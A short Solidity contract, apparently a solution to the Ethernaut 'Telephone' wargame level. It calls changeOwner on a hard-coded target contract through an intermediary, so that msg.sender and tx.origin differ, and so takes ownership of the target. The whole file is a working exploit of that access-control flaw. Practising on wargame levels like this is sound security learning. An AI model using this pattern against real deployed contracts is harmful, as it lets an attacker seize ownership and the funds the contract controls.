// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// @notice try to get difference value from tx.origin and msg.sender to get ownership of contract

interface interface_Telephone {
    function changeOwner(address _owner) external;
}

contract A {
    address address_Telephone = 0x1b6bC14Dca8d6BC15C823Fb9ef459513B3f26C37;
    interface_Telephone Telephone = interface_Telephone(address_Telephone);
    
    function changeTelephoneOwner() public {
        Telephone.changeOwner(tx.origin);
    }
}
